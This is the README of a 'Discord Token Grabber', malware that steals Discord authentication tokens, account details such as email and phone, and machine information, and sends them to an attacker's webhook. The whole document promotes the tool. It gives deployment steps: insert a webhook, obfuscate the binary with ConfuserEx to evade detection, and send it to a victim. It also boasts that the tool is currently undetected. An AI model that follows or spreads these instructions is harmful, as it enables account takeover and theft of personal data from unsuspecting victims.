
<h1 align="center">Discord Token Grabber</h1>
First of all I would like to give credit to Tex0432 the Programmer behind the original program, he deserves the credit and initial hard work :)
# Features

- [x] *Grabs all the computer information such as IP, CPU Architecture, RAM, Time, Operating System, and region.*
- [x] *Grabs all the token information such as username, avatar, phone, email, and more.*
- [x] *No local caching.*
- [x] *Everything is sent by a webhook.*
            
               
- [ ] *Working on every operating system.*
- [ ] *Resend the information when the victim starting discord.*
- [ ] *Can be tracked by HTTP Debugger.*
- [ ] *Program that asks for the webhook than compile the grabber with user's input (Easier for beginners)*

# How it Works.
Discord tokens are stored in the victim's computer, The program goes into the directory it stored and grabs all the tokens, Then the program verifies the authorization token and checks if it works, In case the authorization token not working the program will exit. And the program grabs the computer information.

# Using:
1) Create a webhook, [tutorial here](https://www.youtube.com/watch?v=zxi926qhP7w).
2) In the settings file you have a line with "YOUR_WEBHOOK_HERE" replace it with your webhook.
3) I recommend you to obfuscate the program, you can do it with ([ConfuserEx](https://github.com/yck1509/ConfuserEx/releases))
4) Send the program to your victim.
# Detection
Right now, The program is  pretty undetected because it's not pasted and fresh
